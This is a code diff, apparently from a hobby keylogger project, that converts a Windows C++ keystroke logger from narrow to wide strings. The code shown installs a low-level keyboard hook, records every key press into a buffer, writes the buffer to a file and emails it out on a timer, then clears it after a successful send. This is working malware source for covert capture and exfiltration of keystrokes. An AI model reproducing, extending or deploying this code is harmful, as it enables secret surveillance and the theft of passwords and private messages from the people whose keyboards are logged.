@@ -12,8 +12,8 @@
 //we gonna use hooks to keep track of keystrokes
 //this is the heart and soul of this project
 
-//keylog string has all the keystrokes
-std::string keylog = "";
+//keylog wstring has all the keystrokes
+std::wstring keylog = L"";
 
 void TimerSendMail()
 {
@@ -23,27 +23,27 @@ void TimerSendMail()
         return;
     }
     //if keylog is not empty, write it to a file
-    std::string last_file = IO::WriteLog(keylog);
+    std::wstring last_file = IO::WriteLog(keylog);
 
     //if file creation was unsuccessful: write to debugging log
     if(last_file.empty())
     {
-        Helper::WriteAppLog("File Creation was not successful. Keylog '" + keylog + "'");
+        Helper::WriteAppLog(L"File Creation was not successful. Keylog '" + keylog + L"'");
         return;
     }
 
-    int x = Mail::SendMail("Log [" + last_file + "]",
-                           "Hi :)\nThe File has been attached\n"
-                           "Testing, enjoy\n" + keylog,
+    int x = Mail::SendMail(L"Log [" + last_file + L"]",
+                           L"Hi :)\nThe File has been attached\n"
+                           L"Testing, enjoy\n" + keylog,
                             IO::GetOurPath(true) + last_file);
     //checking if mail was sent
     if(x != 7)
     {
-        Helper::WriteAppLog("Mail was not sent. error code: " + Helper::toSTDString(x));
+        Helper::WriteAppLog(L"Mail was not sent. error code: " + Helper::toSTDString(x));
     }
     else
     {   //clearing keystroke log
-        keylog = "";
+        keylog = L"";
     }
 
 }
@@ -68,7 +68,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
     //if a key is pressed
     if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
     {
-        //append the pressed keys to the keylog string
+        //append the pressed keys to the keylog wstring
         //how do we know which keys were pressed?
         //refere to the keyconstants.h file for more info
         keylog += Keys::KEYS[kbs->vkCode].Name;
@@ -76,7 +76,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
         //if enter is logged, actually include a newline in keylog
         if(kbs->vkCode == VK_RETURN)
         {
-            keylog += '\n';
+            keylog += L'\n';
 
         }
     }
@@ -101,8 +101,8 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
         {
             //adds which system keys were pressed and inserts
             //a "/" if it was let go to signify when it was let go
-           std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
-           KeyName.insert(1, "/");
+           std::wstring KeyName = Keys::KEYS[kbs->vkCode].Name;
+           KeyName.insert(1, L"/");
            keylog += KeyName;
         }
     }
@@ -112,7 +112,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
 bool InstallHook()
 {
-    Helper::WriteAppLog("Hook Started... timer started");
+    Helper::WriteAppLog(L"Hook Started... timer started");
     MailTimer.start();
 
     eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
